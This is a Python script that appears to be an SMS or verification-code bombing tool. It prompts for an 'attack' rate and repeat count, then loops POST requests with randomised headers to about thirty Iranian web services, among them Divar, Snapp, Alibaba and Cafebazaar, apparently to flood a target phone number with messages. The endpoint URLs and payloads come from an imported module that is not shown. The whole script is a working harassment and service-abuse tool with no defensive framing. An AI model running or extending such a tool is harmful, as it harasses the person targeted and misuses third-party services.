import requests
import random
import time
from tqdm import tqdm
import emoji

#########################
black = '\033[30m'
white = '\033[37m'
Blue ="\033[1;34m"
yellow = '\033[33m'
Red="\033[1;31m"
Green="\033[1;33m"
pink = "\033[95m"
Grey="\033[1;30m"
Reset="\033[0m"
cyan = "\033[36m"
purple = "\033[35m"
#########################

from date import *

attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset)))

sleep_time = float(input(("" + cyan + "[" + Red + "Enter the " + Blue + "time between attacks" + cyan + "]─[" + Red + "seconds :" + cyan + "]" + Reset)))

refresh = int(input("" + cyan + "[" + Red + "Enter" + cyan + "]─[" + Blue + "the number" + cyan + "]─[" + Green + "of repetitions :" + cyan + "]" + Red + ": " + Reset))







i = 0

in_Iran_request = 1

if in_Iran == "y":
    in_Iran_request = 0
else:
    in_Iran_request = 1

ALl_request = 30

ALl_r = ALl_request-in_Iran_request

while i < refresh:
    pbar = tqdm(total=ALl_r, desc="Sending requests 🚀🚀🚀 :", bar_format="{desc}: {percentage:3.0f}% |{bar}| 🚀 {n_fmt}/{total_fmt} requests sent")

    random_head = random.choice(heads)

    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})
    
    req_jet = requests.post(url=url_jet,json=json_jet,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})
    
    req_virgool = requests.post(url=url_virgool,json=json_virgool,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_snapp_box = requests.post(url=url_snapp_box,json=json_snapp_box,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_basalam = requests.post(url=url_basalam,json=json_basalam,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_buskool = requests.post(url=url_buskool,json=json_buskool,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_jabama = requests.post(url=url_jabama,json=json_jabama,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_alibaba = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_digitoon = requests.post(url=url_digitoon,json=json_digitoon,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_sibapp = requests.post(url=url_sibapp,json=json_sibapp,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_Drdr = requests.post(url=url_Drdr,json=json_Drdr,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_kukala = requests.post(url=url_kukala,json=json_kukala,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_tapsi = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_flightio = requests.post(url=url_flightio,json=json_flightio,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_football_360 = requests.post(url=url_football_360,json=json_football_360,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_miare = requests.post(url=url_miare,json=json_miare,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_pinket = requests.post(url=url_pinket,json=json_pinket,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    if in_Iran == "y":
        req_torob = requests.get(url=url_torob)
        time.sleep(sleep_time)
        pbar.update(1)
        pbar.set_postfix({"Request sent": i+1})

    req_cafebazaar = requests.post(url=url_cafebazaar,json=json_cafebazaar,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_gap = requests.post(url=url_gap,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_sibche = requests.post(url=url_sibche,json=json_sibche,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_ponisha = requests.post(url=url_ponisha,json=json_ponisha,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_karlancer = requests.post(url=url_karlancer,json=json_karlancer,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_jobvision = requests.post(url=url_jobvision,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_komodaa = requests.post(url=url_komodaa,json=json_komodaa,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    req_pindo = requests.post(url=url_pindo,json=json_pindo,headers=random_head)
    time.sleep(sleep_time)
    pbar.update(1)
    pbar.set_postfix({"Request sent": i+1})

    pbar.close()




    i += 1
    print("" + cyan + "[" + Red + "Number" + cyan + "]─[" + Blue + "of" + cyan + "]─[" + Green + "repetitions :" + cyan + "]" + Red + ": " + cyan + "[" + Green + str(i) + cyan + "]")

